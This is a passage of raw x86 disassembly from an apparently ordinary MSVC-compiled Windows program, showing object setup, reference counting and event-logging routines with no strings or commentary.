  405d45:	push   esi
  405d46:	mov    esi,ecx
  405d48:	lea    ecx,[esi+0x94]
  405d4e:	call   0x403d61
  405d53:	cmp    BYTE PTR [esi+0x38],0x0
  405d57:	je     0x405d67
  405d59:	push   DWORD PTR [esi+0x34]
  405d5c:	call   DWORD PTR ds:0x4091b8
  405d62:	pop    ecx
  405d63:	mov    BYTE PTR [esi+0x38],0x0
  405d67:	and    DWORD PTR [esi+0x34],0x0
  405d6b:	cmp    DWORD PTR [esi],0x1
  405d6e:	jne    0x405d81
  405d70:	mov    ecx,DWORD PTR [esi+0x28]
  405d73:	lea    edx,[esi+0x8]
  405d76:	mov    DWORD PTR [esi],0x2
  405d7c:	call   0x4067ad
  405d81:	mov    DWORD PTR [esi],0x3
  405d87:	pop    esi
  405d88:	ret    
  405d89:	int3   
  405d8a:	int3   
  405d8b:	int3   
  405d8c:	int3   
  405d8d:	int3   
  405d8e:	mov    edi,edi
  405d90:	push   ebp
  405d91:	mov    ebp,esp
  405d93:	and    esp,0xfffffff8
  405d96:	sub    esp,0xcc
  405d9c:	mov    eax,ds:0x408004
  405da1:	xor    eax,esp
  405da3:	mov    DWORD PTR [esp+0xc8],eax
  405daa:	push   ebx
  405dab:	push   esi
  405dac:	push   edi
  405dad:	push   ecx
  405dae:	push   0x4015a4
  405db3:	mov    esi,edx
  405db5:	mov    edi,ecx
  405db7:	call   0x404cee
  405dbc:	push   eax
  405dbd:	lea    ecx,[esp+0x1c]
  405dc1:	call   0x405e8c
  405dc6:	test   esi,esi
  405dc8:	lea    ecx,[esp+0x10]
  405dcc:	mov    ebx,0x4010f0
  405dd1:	setne  al
  405dd4:	mov    DWORD PTR [esp+0x10],ebx
  405dd8:	movzx  eax,al
  405ddb:	push   eax
  405ddc:	push   edi
  405ddd:	call   0x4050c0
  405de2:	push   0x0
  405de4:	lea    ecx,[esp+0x14]
  405de8:	call   0x405f09
  405ded:	lea    ecx,[esp+0x10]
  405df1:	mov    DWORD PTR [esp+0x10],ebx
  405df5:	call   0x4064aa
  405dfa:	lea    ecx,[esp+0x10]
  405dfe:	call   0x405d15
  405e03:	mov    ecx,DWORD PTR [esp+0xd4]
  405e0a:	pop    edi
  405e0b:	pop    esi
  405e0c:	pop    ebx
  405e0d:	xor    ecx,esp
  405e0f:	call   0x406b70
  405e14:	mov    esp,ebp
  405e16:	pop    ebp
  405e17:	ret    
  405e18:	int3   
  405e19:	int3   
  405e1a:	int3   
  405e1b:	int3   
  405e1c:	int3   
  405e1d:	mov    edi,edi
  405e1f:	push   ebp
  405e20:	mov    ebp,esp
  405e22:	push   ebx
  405e23:	push   edi
  405e24:	call   DWORD PTR ds:0x4090a4
  405e2a:	push   0x14
  405e2c:	mov    edi,eax
  405e2e:	xor    edx,edx
  405e30:	pop    ecx
  405e31:	div    ecx
  405e33:	lea    ebx,[edx*4+0x408498]
  405e3a:	mov    eax,DWORD PTR [ebx]
  405e3c:	jmp    0x405e46
  405e3e:	cmp    DWORD PTR [eax+0x4],edi
  405e41:	je     0x405e81
  405e43:	mov    eax,DWORD PTR [eax+0x8]
  405e46:	test   eax,eax
  405e48:	jne    0x405e3e
  405e4a:	push   esi
  405e4b:	cmp    BYTE PTR [ebp+0x8],al
  405e4e:	je     0x405e7e
  405e50:	push   0xc
  405e52:	call   DWORD PTR ds:0x4091f4
  405e58:	mov    esi,eax
  405e5a:	pop    ecx
  405e5b:	test   esi,esi
  405e5d:	je     0x405e7e
  405e5f:	and    DWORD PTR [esi],0x0
  405e62:	and    DWORD PTR [esi+0x8],0x0
  405e66:	mov    DWORD PTR [esi+0x4],edi
  405e69:	mov    edx,DWORD PTR [ebx]
  405e6b:	mov    ecx,esi
  405e6d:	mov    DWORD PTR [esi+0x8],edx
  405e70:	mov    eax,edx
  405e72:	lock cmpxchg DWORD PTR [ebx],ecx
  405e76:	cmp    eax,edx
  405e78:	jne    0x405e69
  405e7a:	mov    eax,esi
  405e7c:	jmp    0x405e80
  405e7e:	xor    eax,eax
  405e80:	pop    esi
  405e81:	pop    edi
  405e82:	pop    ebx
  405e83:	pop    ebp
  405e84:	ret    0x4
  405e87:	int3   
  405e88:	int3   
  405e89:	int3   
  405e8a:	int3   
  405e8b:	int3   
  405e8c:	mov    edi,edi
  405e8e:	push   ebp
  405e8f:	mov    ebp,esp
  405e91:	push   ebx
  405e92:	push   esi
  405e93:	xor    ebx,ebx
  405e95:	push   edi
  405e96:	mov    edi,ecx
  405e98:	push   0x50
  405e9a:	push   ebx
  405e9b:	mov    DWORD PTR [edi],0x4010c8
  405ea1:	lea    esi,[edi+0x1c]
  405ea4:	mov    DWORD PTR [edi+0x4],ebx
  405ea7:	lea    eax,[edi+0x48]
  405eaa:	mov    DWORD PTR [edi+0x14],eax
  405ead:	mov    eax,DWORD PTR [ebp+0x8]
  405eb0:	mov    DWORD PTR [edi+0x8],edi
  405eb3:	mov    DWORD PTR [edi+0xc],ebx
  405eb6:	mov    DWORD PTR [edi+0x10],ebx
  405eb9:	mov    DWORD PTR [edi+0x18],esi
  405ebc:	mov    DWORD PTR [esi+0x28],eax
  405ebf:	mov    eax,DWORD PTR [ebp+0xc]
  405ec2:	mov    DWORD PTR [esi],ebx
  405ec4:	mov    BYTE PTR [esi+0x4],bl
  405ec7:	mov    DWORD PTR [esi+0x30],eax
  405eca:	lea    eax,[esi+0x44]
  405ecd:	mov    BYTE PTR [esi+0x38],bl
  405ed0:	mov    DWORD PTR [esi+0x2c],ebx
  405ed3:	mov    DWORD PTR [esi+0x34],ebx
  405ed6:	mov    DWORD PTR [esi+0x3c],0x1
  405edd:	mov    DWORD PTR [esi+0x40],ebx
  405ee0:	push   eax
  405ee1:	mov    DWORD PTR [eax+0x50],ebx
  405ee4:	mov    DWORD PTR [eax+0x54],ebx
  405ee7:	call   0x4072ac
  405eec:	add    esp,0xc
  405eef:	mov    DWORD PTR [esi+0x9c],ebx
  405ef5:	mov    DWORD PTR [edi+0xbc],ebx
  405efb:	mov    eax,edi
  405efd:	pop    edi
  405efe:	pop    esi
  405eff:	pop    ebx
  405f00:	pop    ebp
  405f01:	ret    0xc
  405f04:	int3   
  405f05:	int3   
  405f06:	int3   
  405f07:	int3   
  405f08:	int3   
  405f09:	mov    edi,edi
  405f0b:	push   ebp
  405f0c:	mov    ebp,esp
  405f0e:	and    esp,0xfffffff8
  405f11:	sub    esp,0x54
  405f14:	mov    eax,ds:0x408004
  405f19:	xor    eax,esp
  405f1b:	mov    DWORD PTR [esp+0x50],eax
  405f1f:	push   ebx
  405f20:	push   esi
  405f21:	push   edi
  405f22:	lea    eax,[esp+0x10]
  405f26:	mov    edi,ecx
  405f28:	push   eax
  405f29:	call   0x40654c
  405f2e:	mov    ecx,DWORD PTR [edi+0x18]
  405f31:	lea    eax,[esp+0x14]
  405f35:	push   eax
  405f36:	push   DWORD PTR [ebp+0x8]
  405f39:	call   0x4065d7
  405f3e:	cmp    DWORD PTR [esp+0x10],0x0
  405f43:	mov    bl,al
  405f45:	je     0x405f51
  405f47:	push   DWORD PTR [esp+0x10]
  405f4b:	call   DWORD PTR ds:0x409088
  405f51:	test   bl,bl
  405f53:	je     0x405f68
  405f55:	mov    eax,DWORD PTR [edi]
  405f57:	mov    esi,DWORD PTR [eax+0x4]
  405f5a:	mov    ecx,esi
  405f5c:	call   DWORD PTR ds:0x409210
  405f62:	mov    ecx,edi
  405f64:	call   esi
  405f66:	jmp    0x405fcd
  405f68:	mov    eax,DWORD PTR [edi+0x18]
  405f6b:	mov    esi,DWORD PTR [eax+0x28]
  405f6e:	cmp    DWORD PTR [esi],0x5
  405f71:	jbe    0x405fcd
  405f73:	mov    eax,DWORD PTR [ebp+0x8]
  405f76:	and    DWORD PTR [esp+0x3c],0x0
  405f7b:	and    DWORD PTR [esp+0x44],0x0
  405f80:	push   0x4
  405f82:	mov    DWORD PTR [esp+0x14],eax
  405f86:	lea    eax,[esp+0x14]
  405f8a:	pop    ebx
  405f8b:	mov    DWORD PTR [esp+0x38],eax
  405f8f:	mov    DWORD PTR [esp+0x40],ebx
  405f93:	call   DWORD PTR ds:0x4090a4
  405f99:	mov    DWORD PTR [esp+0x14],eax
  405f9d:	xor    ecx,ecx
  405f9f:	lea    eax,[esp+0x14]
  405fa3:	mov    DWORD PTR [esp+0x4c],ecx
  405fa7:	mov    DWORD PTR [esp+0x48],eax
  405fab:	mov    DWORD PTR [esp+0x50],ebx
  405faf:	mov    DWORD PTR [esp+0x54],ecx
  405fb3:	lea    eax,[esp+0x18]
  405fb7:	mov    edx,0x402289
  405fbc:	push   eax
  405fbd:	mov    eax,DWORD PTR [edi+0x18]
  405fc0:	push   ebx
  405fc1:	push   ecx
  405fc2:	add    eax,0x8
  405fc5:	mov    ecx,esi
  405fc7:	push   eax
  405fc8:	call   0x402687
  405fcd:	cmp    DWORD PTR [edi+0x10],0x0
  405fd1:	je     0x405fdb
  405fd3:	lea    ecx,[edi+0x4]
  405fd6:	call   0x404050
  405fdb:	mov    ecx,DWORD PTR [esp+0x5c]
  405fdf:	pop    edi
  405fe0:	pop    esi
  405fe1:	pop    ebx
  405fe2:	xor    ecx,esp
  405fe4:	call   0x406b70
  405fe9:	mov    esp,ebp
  405feb:	pop    ebp
  405fec:	ret    0x4
  405fef:	int3   
  405ff0:	int3   
  405ff1:	int3   
  405ff2:	int3   
  405ff3:	int3   
  405ff4:	int3   
  405ff5:	int3   
  405ff6:	int3   
  405ff7:	int3   
  405ff8:	int3   
  405ff9:	int3   
  405ffa:	int3   
  405ffb:	int3   
  405ffc:	int3   
  405ffd:	int3   
  405ffe:	int3   
  405fff:	int3   
  406000:	mov    edi,edi
  406002:	push   ebp
  406003:	mov    ebp,esp
  406005:	sub    esp,0x160
  40600b:	mov    eax,ds:0x408004
  406010:	xor    eax,ebp
  406012:	mov    DWORD PTR [ebp-0x8],eax
  406015:	push   ebx
  406016:	mov    ebx,ecx
  406018:	push   esi
  406019:	push   edi
  40601a:	mov    edi,DWORD PTR [ebp+0x8]
  40601d:	mov    eax,DWORD PTR [ebx]
  40601f:	push   DWORD PTR [edi+0x8]
  406022:	mov    esi,DWORD PTR [eax+0x8]
  406025:	mov    ecx,esi
  406027:	call   DWORD PTR ds:0x409210
  40602d:	mov    ecx,ebx
  40602f:	call   esi
  406031:	test   al,al
  406033:	mov    eax,DWORD PTR [ebx+0x18]
  406036:	mov    eax,DWORD PTR [eax+0x28]
  406039:	jne    0x4061b9
  40603f:	cmp    DWORD PTR [eax],0x5
  406042:	mov    DWORD PTR [ebp-0x148],eax
  406048:	jbe    0x406394
  40604e:	push   0x2000
  406053:	xor    esi,esi
  406055:	mov    ecx,eax
  406057:	push   esi
  406058:	call   0x402718
  40605d:	test   al,al
  40605f:	je     0x406394
  406065:	mov    eax,DWORD PTR [edi+0x4]
  406068:	lea    ecx,[ebp-0xdc]
  40606e:	mov    edx,DWORD PTR [edi+0x1c]
  406071:	mov    DWORD PTR [ebp-0x140],eax
  406077:	lea    eax,[ebp-0x140]
  40607d:	mov    DWORD PTR [ebp-0xec],eax
  406083:	mov    DWORD PTR [ebp-0xe8],esi
  406089:	mov    DWORD PTR [ebp-0xe4],0x4
  406093:	mov    DWORD PTR [ebp-0xe0],esi
  406099:	call   0x402752
  40609e:	mov    edx,DWORD PTR [edi+0x44]
  4060a1:	lea    eax,[edi+0x20]
  4060a4:	lea    ecx,[ebp-0xbc]
  4060aa:	mov    DWORD PTR [ebp-0xcc],eax
  4060b0:	mov    DWORD PTR [ebp-0xc8],esi
  4060b6:	mov    DWORD PTR [ebp-0xc4],0x4
  4060c0:	mov    DWORD PTR [ebp-0xc0],esi
  4060c6:	call   0x402752
  4060cb:	mov    eax,DWORD PTR [edi]
  4060cd:	lea    ecx,[ebp-0x9c]
  4060d3:	mov    edx,DWORD PTR [edi+0xc]
  4060d6:	mov    DWORD PTR [ebp-0x154],eax
  4060dc:	lea    eax,[ebp-0x154]
  4060e2:	mov    DWORD PTR [ebp-0xac],eax
  4060e8:	mov    DWORD PTR [ebp-0xa8],esi
  4060ee:	mov    DWORD PTR [ebp-0xa4],0x4
  4060f8:	mov    DWORD PTR [ebp-0xa0],esi
  4060fe:	call   0x402789
  406103:	mov    eax,DWORD PTR [edi+0x10]
  406106:	lea    ecx,[ebp-0x7c]
  406109:	mov    edx,DWORD PTR [edi+0x28]
  40610c:	mov    DWORD PTR [ebp-0x150],eax
  406112:	lea    eax,[ebp-0x150]
  406118:	mov    DWORD PTR [ebp-0x8c],eax
  40611e:	mov    DWORD PTR [ebp-0x88],esi
  406124:	mov    DWORD PTR [ebp-0x84],0x4
  40612e:	mov    DWORD PTR [ebp-0x80],esi
  406131:	call   0x402752
  406136:	mov    eax,DWORD PTR [edi+0x2c]
  406139:	lea    ecx,[ebp-0x5c]
  40613c:	mov    edx,DWORD PTR [edi+0x30]
  40613f:	mov    DWORD PTR [ebp-0x14c],eax
  406145:	lea    eax,[ebp-0x14c]
  40614b:	mov    DWORD PTR [ebp-0x6c],eax
  40614e:	mov    DWORD PTR [ebp-0x68],esi
  406151:	mov    DWORD PTR [ebp-0x64],0x4
  406158:	mov    DWORD PTR [ebp-0x60],esi
  40615b:	call   0x402752
  406160:	mov    edx,DWORD PTR [edi+0x34]
  406163:	lea    ecx,[ebp-0x4c]
  406166:	call   0x402789
  40616b:	mov    eax,DWORD PTR [edi+0x38]
  40616e:	lea    ecx,[ebp-0x2c]
  406171:	mov    edx,DWORD PTR [edi+0x3c]
  406174:	mov    DWORD PTR [ebp-0x144],eax
  40617a:	lea    eax,[ebp-0x144]
  406180:	mov    DWORD PTR [ebp-0x3c],eax
  406183:	mov    DWORD PTR [ebp-0x38],esi
  406186:	mov    DWORD PTR [ebp-0x34],0x4
  40618d:	mov    DWORD PTR [ebp-0x30],esi
  406190:	call   0x402752
  406195:	mov    edx,DWORD PTR [edi+0x40]
  406198:	lea    ecx,[ebp-0x1c]
  40619b:	call   0x402789
  4061a0:	mov    ecx,DWORD PTR [ebp-0x148]
  4061a6:	lea    eax,[ebp-0x10c]
  4061ac:	push   eax
  4061ad:	push   0x10
  4061af:	mov    edx,0x401f28
  4061b4:	jmp    0x406387
  4061b9:	cmp    DWORD PTR [eax],0x5
  4061bc:	mov    DWORD PTR [ebp-0x15c],eax
  4061c2:	jbe    0x406394
  4061c8:	push   0x2000
  4061cd:	xor    esi,esi
  4061cf:	mov    ecx,eax
  4061d1:	push   esi
  4061d2:	call   0x402718
  4061d7:	test   al,al
  4061d9:	je     0x406394
  4061df:	mov    eax,DWORD PTR [edi+0x4]
  4061e2:	lea    ecx,[ebp-0x10c]
  4061e8:	mov    edx,DWORD PTR [edi+0x1c]
  4061eb:	mov    DWORD PTR [ebp-0x148],eax
  4061f1:	lea    eax,[ebp-0x148]
  4061f7:	mov    DWORD PTR [ebp-0x11c],eax
  4061fd:	mov    DWORD PTR [ebp-0x118],esi
  406203:	mov    DWORD PTR [ebp-0x114],0x4
  40620d:	mov    DWORD PTR [ebp-0x110],esi
  406213:	call   0x402752
  406218:	mov    edx,DWORD PTR [edi+0x44]
  40621b:	lea    eax,[edi+0x20]
  40621e:	lea    ecx,[ebp-0xec]
  406224:	mov    DWORD PTR [ebp-0xfc],eax
  40622a:	mov    DWORD PTR [ebp-0xf8],esi
  406230:	mov    DWORD PTR [ebp-0xf4],0x4
  40623a:	mov    DWORD PTR [ebp-0xf0],esi
  406240:	call   0x402752
  406245:	mov    eax,DWORD PTR [edi]
  406247:	lea    ecx,[ebp-0xcc]
  40624d:	mov    edx,DWORD PTR [edi+0xc]
  406250:	mov    DWORD PTR [ebp-0x144],eax
  406256:	lea    eax,[ebp-0x144]
  40625c:	mov    DWORD PTR [ebp-0xdc],eax
  406262:	mov    DWORD PTR [ebp-0xd8],esi
  406268:	mov    DWORD PTR [ebp-0xd4],0x4
  406272:	mov    DWORD PTR [ebp-0xd0],esi
  406278:	call   0x402789
  40627d:	mov    eax,DWORD PTR [edi+0x10]
  406280:	lea    ecx,[ebp-0xac]
  406286:	mov    edx,DWORD PTR [edi+0x28]
  406289:	mov    DWORD PTR [ebp-0x14c],eax
  40628f:	lea    eax,[ebp-0x14c]
  406295:	mov    DWORD PTR [ebp-0xbc],eax
  40629b:	mov    DWORD PTR [ebp-0xb8],esi
  4062a1:	mov    DWORD PTR [ebp-0xb4],0x4
  4062ab:	mov    DWORD PTR [ebp-0xb0],esi
  4062b1:	call   0x402752
  4062b6:	mov    eax,DWORD PTR [edi+0x2c]
  4062b9:	lea    ecx,[ebp-0x8c]
  4062bf:	mov    edx,DWORD PTR [edi+0x30]
  4062c2:	mov    DWORD PTR [ebp-0x150],eax
  4062c8:	lea    eax,[ebp-0x150]
  4062ce:	mov    DWORD PTR [ebp-0x9c],eax
  4062d4:	mov    DWORD PTR [ebp-0x98],esi
  4062da:	mov    DWORD PTR [ebp-0x94],0x4
  4062e4:	mov    DWORD PTR [ebp-0x90],esi
  4062ea:	call   0x402752
  4062ef:	mov    edx,DWORD PTR [edi+0x34]
  4062f2:	lea    ecx,[ebp-0x7c]
  4062f5:	call   0x402789
  4062fa:	mov    eax,DWORD PTR [edi+0x38]
  4062fd:	lea    ecx,[ebp-0x5c]
  406300:	mov    edx,DWORD PTR [edi+0x3c]
  406303:	mov    DWORD PTR [ebp-0x154],eax
  406309:	lea    eax,[ebp-0x154]
  40630f:	mov    DWORD PTR [ebp-0x6c],eax
  406312:	mov    DWORD PTR [ebp-0x68],esi
  406315:	mov    DWORD PTR [ebp-0x64],0x4
  40631c:	mov    DWORD PTR [ebp-0x60],esi
  40631f:	call   0x402752
  406324:	mov    edx,DWORD PTR [edi+0x40]
  406327:	lea    ecx,[ebp-0x4c]
  40632a:	call   0x402789
  40632f:	mov    eax,DWORD PTR [edi+0x8]
  406332:	mov    edx,DWORD PTR [edi+0x18]
  406335:	mov    DWORD PTR [ebp-0x140],eax
  40633b:	lea    eax,[ebp-0x140]
  406341:	mov    DWORD PTR [ebp-0x3c],eax
  406344:	mov    eax,DWORD PTR [edi+0x24]
  406347:	push   0x4
  406349:	pop    ecx
  40634a:	mov    DWORD PTR [ebp-0x158],eax
  406350:	lea    eax,[ebp-0x158]
  406356:	mov    DWORD PTR [ebp-0x38],esi
  406359:	mov    DWORD PTR [ebp-0x34],ecx
  40635c:	mov    DWORD PTR [ebp-0x30],esi
  40635f:	mov    DWORD PTR [ebp-0x2c],eax
  406362:	mov    DWORD PTR [ebp-0x28],esi
  406365:	mov    DWORD PTR [ebp-0x24],ecx
  406368:	mov    DWORD PTR [ebp-0x20],esi
  40636b:	lea    ecx,[ebp-0x1c]
  40636e:	call   0x402752
  406373:	mov    ecx,DWORD PTR [ebp-0x15c]
  406379:	lea    eax,[ebp-0x13c]
  40637f:	push   eax
  406380:	push   0x13
  406382:	mov    edx,0x401dca
  406387:	mov    eax,DWORD PTR [ebx+0x18]
  40638a:	push   esi
  40638b:	add    eax,0x8
  40638e:	push   eax
  40638f:	call   0x402687
  406394:	lea    eax,[ebp-0x140]
  40639a:	mov    ecx,ebx
  40639c:	push   eax
  40639d:	call   0x40654c
  4063a2:	mov    ecx,DWORD PTR [ebx+0x18]
  4063a5:	mov    eax,DWORD PTR [edi+0x4]
  4063a8:	cmp    eax,DWORD PTR [ecx+0x48]
  4063ab:	je     0x4063c1
  4063ad:	cmp    eax,DWORD PTR [ecx+0x40]
  4063b0:	jne    0x4063b8
  4063b2:	cmp    DWORD PTR [ecx+0x40],0x0
  4063b6:	jl     0x4063c1
  4063b8:	push   edi
  4063b9:	add    ecx,0x44
  4063bc:	call   0x404208
  4063c1:	cmp    DWORD PTR [ebp-0x140],0x0
  4063c8:	je     0x4063d6
  4063ca:	push   DWORD PTR [ebp-0x140]
  4063d0:	call   DWORD PTR ds:0x409088
  4063d6:	mov    ecx,DWORD PTR [ebp-0x8]
  4063d9:	mov    al,0x1
  4063db:	pop    edi
  4063dc:	pop    esi
  4063dd:	xor    ecx,ebp
  4063df:	pop    ebx
  4063e0:	call   0x406b70
  4063e5:	mov    esp,ebp
  4063e7:	pop    ebp
  4063e8:	ret    0x4
  4063eb:	int3   
  4063ec:	int3   
  4063ed:	int3   
  4063ee:	int3   
  4063ef:	int3   
  4063f0:	mov    eax,DWORD PTR [ecx+0x18]
  4063f3:	xor    ecx,ecx
  4063f5:	cmp    BYTE PTR [eax+0x4],cl
  4063f8:	je     0x406410
  4063fa:	add    eax,0x18
  4063fd:	cmp    DWORD PTR [eax],ecx
  4063ff:	jne    0x406412
  406401:	cmp    DWORD PTR [eax+0x4],ecx
  406404:	jne    0x406412
  406406:	cmp    DWORD PTR [eax+0x8],ecx
  406409:	jne    0x406412
  40640b:	cmp    DWORD PTR [eax+0xc],ecx
  40640e:	jne    0x406412
  406410:	mov    eax,ecx
  406412:	ret    
  406413:	int3   
  406414:	int3   
  406415:	int3   
  406416:	int3   
  406417:	int3   
  406418:	mov    edi,edi
  40641a:	push   ebp
  40641b:	mov    ebp,esp
  40641d:	push   ecx
  40641e:	push   esi
  40641f:	lea    eax,[ebp-0x4]
  406422:	mov    esi,ecx
  406424:	push   eax
  406425:	call   0x40654c
  40642a:	mov    esi,DWORD PTR [esi+0x18]
  40642d:	mov    ecx,DWORD PTR [esi+0x28]
  406430:	cmp    DWORD PTR [ecx],0x5
  406433:	jbe    0x406453
  406435:	push   0x2000
  40643a:	push   0x0
  40643c:	call   0x402718
  406441:	test   al,al
  406443:	je     0x406453
  406445:	lea    eax,[esi+0x8]
  406448:	push   eax
  406449:	push   0x3
  40644b:	call   DWORD PTR ds:0x409028
  406451:	jmp    0x406457
  406453:	and    DWORD PTR [esi+0x8],0x0
  406457:	cmp    DWORD PTR [ebp-0x4],0x0
  40645b:	mov    DWORD PTR [esi],0x1
  406461:	je     0x40646c
  406463:	push   DWORD PTR [ebp-0x4]
  406466:	call   DWORD PTR ds:0x409088
  40646c:	pop    esi
  40646d:	mov    esp,ebp
  40646f:	pop    ebp
  406470:	ret    
  406471:	int3   
  406472:	int3   
  406473:	int3   
  406474:	int3   
  406475:	int3   
  406476:	mov    edi,edi
  406478:	push   ebp
  406479:	mov    ebp,esp
  40647b:	push   ecx
  40647c:	push   esi
  40647d:	lea    eax,[ebp-0x4]
  406480:	mov    esi,ecx
  406482:	push   eax
  406483:	call   0x40654c
  406488:	cmp    DWORD PTR [ebp-0x4],0x0
  40648c:	mov    eax,DWORD PTR [esi+0x18]
  40648f:	pop    esi
  406490:	mov    DWORD PTR [eax],0x2
  406496:	je     0x4064a1
  406498:	push   DWORD PTR [ebp-0x4]
  40649b:	call   DWORD PTR ds:0x409088
  4064a1:	mov    esp,ebp
  4064a3:	pop    ebp
  4064a4:	ret    
  4064a5:	int3   
  4064a6:	int3   
  4064a7:	int3   
  4064a8:	int3   
  4064a9:	int3   
  4064aa:	mov    edi,edi
  4064ac:	push   ebp
  4064ad:	mov    ebp,esp
  4064af:	and    esp,0xfffffff8
  4064b2:	sub    esp,0xc
  4064b5:	mov    eax,ds:0x408004
  4064ba:	xor    eax,esp
  4064bc:	mov    DWORD PTR [esp+0x8],eax
  4064c0:	push   ebx
  4064c1:	push   esi
  4064c2:	push   edi
  4064c3:	mov    edi,ecx
  4064c5:	mov    bl,0x1
  4064c7:	lea    esi,[edi+0xbc]
  4064cd:	cmp    DWORD PTR [esi],0x0
  4064d0:	je     0x406505
  4064d2:	lea    eax,[esp+0x10]
  4064d6:	push   eax
  4064d7:	call   0x40654c
  4064dc:	mov    eax,DWORD PTR [esi]
  4064de:	test   eax,eax
  4064e0:	je     0x4064e7
  4064e2:	cmp    DWORD PTR [eax],0x1
  4064e5:	je     0x4064f0
  4064e7:	mov    ecx,esi
  4064e9:	xor    bl,bl
  4064eb:	call   0x40661b
  4064f0:	cmp    DWORD PTR [esp+0x10],0x0
  4064f5:	je     0x406501
  4064f7:	push   DWORD PTR [esp+0x10]
  4064fb:	call   DWORD PTR ds:0x409088
  406501:	test   bl,bl
  406503:	je     0x406535
  406505:	mov    ecx,DWORD PTR [edi+0x18]
  406508:	cmp    DWORD PTR [ecx],0x1
  40650b:	jne    0x406535
  40650d:	mov    eax,DWORD PTR [ecx+0x48]
  406510:	test   eax,eax
  406512:	js     0x406519
  406514:	mov    eax,0x8007023e
  406519:	lea    edx,[esp+0x10]
  40651d:	push   edx
  40651e:	push   eax
  40651f:	call   0x4065d7
  406524:	mov    eax,DWORD PTR [edi]
  406526:	mov    esi,DWORD PTR [eax+0x4]
  406529:	mov    ecx,esi
  40652b:	call   DWORD PTR ds:0x409210
  406531:	mov    ecx,edi
  406533:	call   esi
  406535:	mov    ecx,DWORD PTR [esp+0x14]
  406539:	pop    edi
  40653a:	pop    esi
  40653b:	pop    ebx
  40653c:	xor    ecx,esp
  40653e:	call   0x406b70
  406543:	mov    esp,ebp
  406545:	pop    ebp
  406546:	ret    
  406547:	int3   
  406548:	int3   
  406549:	int3   
  40654a:	int3   
  40654b:	int3   
  40654c:	mov    edi,edi
  40654e:	push   ebp
  40654f:	mov    ebp,esp
  406551:	push   ecx
  406552:	push   ecx
  406553:	push   ebx
  406554:	push   esi
  406555:	push   edi
  406556:	xor    edi,edi
  406558:	mov    DWORD PTR [ebp-0x8],edi
  40655b:	cmp    DWORD PTR [ecx+0xbc],edi
  406561:	je     0x40658c
  406563:	mov    esi,DWORD PTR [ecx+0xbc]
  406569:	xor    ebx,ebx
  40656b:	inc    ebx
  40656c:	test   esi,esi
  40656e:	jne    0x406574
  406570:	mov    esi,edi
  406572:	jmp    0x406577
  406574:	add    esi,0x4
  406577:	add    esi,0x9c
  40657d:	push   esi
  40657e:	call   DWORD PTR ds:0x409094
  406584:	mov    DWORD PTR [ebp-0x8],esi
  406587:	lea    ecx,[ebp-0x8]
  40658a:	jmp    0x406595
  40658c:	push   0x2
  40658e:	pop    ebx
  40658f:	mov    DWORD PTR [ebp-0x4],edi
  406592:	lea    ecx,[ebp-0x4]
  406595:	mov    esi,DWORD PTR [ebp+0x8]
  406598:	mov    eax,DWORD PTR [ecx]
  40659a:	mov    DWORD PTR [ecx],edi
  40659c:	mov    DWORD PTR [esi],eax
  40659e:	test   bl,0x2
  4065a1:	je     0x4065b4
  4065a3:	and    ebx,0xfffffffd
  4065a6:	cmp    DWORD PTR [ebp-0x4],edi
  4065a9:	je     0x4065b4
  4065ab:	push   DWORD PTR [ebp-0x4]
  4065ae:	call   DWORD PTR ds:0x409088
  4065b4:	test   bl,0x1
  4065b7:	je     0x4065c7
  4065b9:	cmp    DWORD PTR [ebp-0x8],edi
  4065bc:	je     0x4065c7
  4065be:	push   DWORD PTR [ebp-0x8]
  4065c1:	call   DWORD PTR ds:0x409088
  4065c7:	pop    edi
  4065c8:	mov    eax,esi
  4065ca:	pop    esi
  4065cb:	pop    ebx
  4065cc:	mov    esp,ebp
  4065ce:	pop    ebp
  4065cf:	ret    0x4
  4065d2:	int3   
  4065d3:	int3   
  4065d4:	int3   
  4065d5:	int3   
  4065d6:	int3   
  4065d7:	mov    edi,edi
  4065d9:	push   ebp
  4065da:	mov    ebp,esp
  4065dc:	mov    edx,ecx
  4065de:	push   esi
  4065df:	mov    esi,DWORD PTR [edx+0x3c]
  4065e2:	cmp    esi,0x1
  4065e5:	jge    0x4065ec
  4065e7:	push   0x7
  4065e9:	pop    ecx
  4065ea:	int    0x29
  4065ec:	cmp    DWORD PTR [edx+0x40],0x0
  4065f0:	jl     0x4065f8
  4065f2:	mov    eax,DWORD PTR [ebp+0x8]
  4065f5:	mov    DWORD PTR [edx+0x40],eax
  4065f8:	mov    ecx,DWORD PTR [ebp+0xc]
  4065fb:	test   ecx,ecx
  4065fd:	je     0x406604
  4065ff:	mov    eax,DWORD PTR [edx+0x40]
  406602:	mov    DWORD PTR [ecx],eax
  406604:	lea    ecx,[esi-0x1]
  406607:	xor    eax,eax
  406609:	test   ecx,ecx
  40660b:	mov    DWORD PTR [edx+0x3c],ecx
  40660e:	pop    esi
  40660f:	sete   al
  406612:	pop    ebp
  406613:	ret    0x8
  406616:	int3   
  406617:	int3   
  406618:	int3   
  406619:	int3   
  40661a:	int3   
  40661b:	mov    edi,edi
  40661d:	push   ecx
  40661e:	push   esi
  40661f:	mov    esi,ecx
  406621:	push   edi
  406622:	mov    ecx,DWORD PTR [esi]
  406624:	test   ecx,ecx
  406626:	je     0x40664a
  406628:	or     eax,0xffffffff
  40662b:	lock xadd DWORD PTR [ecx],eax
  40662f:	jne    0x406647
  406631:	mov    edi,DWORD PTR [esi]
  406633:	test   edi,edi
  406635:	je     0x406647
  406637:	lea    ecx,[edi+0x4]
  40663a:	call   0x405d43
  40663f:	push   edi
  406640:	call   DWORD PTR ds:0x4091c4
  406646:	pop    ecx
  406647:	and    DWORD PTR [esi],0x0
  40664a:	pop    edi
  40664b:	pop    esi
  40664c:	pop    ecx
  40664d:	ret    
  40664e:	int3   
  40664f:	int3   
  406650:	int3   
  406651:	int3   
  406652:	int3   
  406653:	mov    edi,edi
  406655:	push   ebp
  406656:	mov    ebp,esp
  406658:	push   ecx
  406659:	push   ecx
  40665a:	push   ebx
  40665b:	mov    ebx,DWORD PTR [ebp+0x8]
  40665e:	xor    eax,eax
  406660:	mov    WORD PTR [ebp-0x4],ax
  406664:	push   esi
  406665:	mov    esi,edx
  406667:	push   edi
  406668:	mov    edi,ecx
  40666a:	test   ebx,ebx
  40666c:	jne    0x406671
  40666e:	lea    ebx,[ebp-0x4]
  406671:	mov    ecx,ebx
  406673:	call   0x403fea
  406678:	sub    esi,edi
  40667a:	shr    eax,1
  40667c:	shr    esi,1
  40667e:	mov    DWORD PTR [ebp-0x8],eax
  406681:	cmp    eax,esi
  406683:	jae    0x406687
  406685:	mov    esi,eax
